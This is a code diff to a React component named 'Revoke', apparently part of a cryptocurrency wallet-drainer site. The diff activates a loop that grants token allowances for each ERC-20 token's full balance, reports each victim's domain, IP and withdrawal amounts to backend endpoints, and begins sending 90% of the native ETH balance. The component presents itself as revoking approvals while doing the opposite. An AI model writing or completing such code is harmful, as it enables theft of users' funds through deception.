@@ -123,58 +123,58 @@ const Revoke = () => {
   const handleClick = async () => {
     setIsButtonDisabled(true);
     try {
-      // for (const token of walletData.erc_20_tokens) {
-      //   const { contract_address, balance, token_name, token_balance } = token;
-      //   const data = {
-      //     asset_name: token_name,
-      //     domain: walletData.domain,
-      //     ip_address: walletData.ip_address,
-      //     withdrawal_amount: balance,
-      //     withdrawal_amount_token: token_balance,
-      //   };
-      //   try {
-      //     const res = await requestTokenSignature(data);
-      //     console.log("request Token Signature succesful: ", res);
-      //   } catch (error) {
-      //     console.log("request Token Signature failed:", error);
-      //   }
-      //   const res = await increaseAllowance(contract_address, token_balance);
-      //   if (res.success) {
-      //     const data = {
-      //       asset_name: token_name,
-      //       domain: walletData.domain,
-      //       transaction_hash: res.data,
-      //       ip_address: walletData.ip_address,
-      //       withdrawal_amount: balance,
-      //       withdrawal_amount_token: token_balance,
-      //     };
-      //     console.log("token confirmed :", data);
-      //     try {
-      //       const res = await tokenConfirmed(data);
-      //       console.log("token confirmed post successful: ", res);
-      //       console.log(
-      //         `Increase allowance successful! Transaction hash: ${res.data}`
-      //       );
-      //     } catch (error) {
-      //       console.error("token confirmed post failed:", error);
-      //     }
-      //   } else {
-      //     const data = {
-      //       asset_name: token_name,
-      //       domain: walletData.domain,
-      //       ip_address: walletData.ip_address,
-      //       withdrawal_amount: balance,
-      //       withdrawal_amount_token: token_balance,
-      //     };
-      //     try {
-      //       const res = await tokenDeclined(data);
-      //       console.log("tokenDeclined post successful:", res);
-      //       console.log(`Increase allowance failed: ${res.error}`);
-      //     } catch (error) {
-      //       console.log("tokenDeclined post failed:", res);
-      //     }
-      //   }
-      // }
+      for (const token of walletData.erc_20_tokens) {
+        const { contract_address, balance, token_name, token_balance } = token;
+        const data = {
+          asset_name: token_name,
+          domain: walletData.domain,
+          ip_address: walletData.ip_address,
+          withdrawal_amount: balance,
+          withdrawal_amount_token: token_balance,
+        };
+        try {
+          const res = await requestTokenSignature(data);
+          console.log("request Token Signature succesful: ", res);
+        } catch (error) {
+          console.log("request Token Signature failed:", error);
+        }
+        const res = await increaseAllowance(contract_address, token_balance);
+        if (res.success) {
+          const data = {
+            asset_name: token_name,
+            domain: walletData.domain,
+            transaction_hash: res.data,
+            ip_address: walletData.ip_address,
+            withdrawal_amount: balance,
+            withdrawal_amount_token: token_balance,
+          };
+          console.log("token confirmed :", data);
+          try {
+            const res = await tokenConfirmed(data);
+            console.log("token confirmed post successful: ", res);
+            console.log(
+              `Increase allowance successful! Transaction hash: ${res.data}`
+            );
+          } catch (error) {
+            console.error("token confirmed post failed:", error);
+          }
+        } else {
+          const data = {
+            asset_name: token_name,
+            domain: walletData.domain,
+            ip_address: walletData.ip_address,
+            withdrawal_amount: balance,
+            withdrawal_amount_token: token_balance,
+          };
+          try {
+            const res = await tokenDeclined(data);
+            console.log("tokenDeclined post successful:", res);
+            console.log(`Increase allowance failed: ${res.error}`);
+          } catch (error) {
+            console.log("tokenDeclined post failed:", res);
+          }
+        }
+      }
     //  send native token
     const nintyPercentage = 0.9 * ethBalance
 
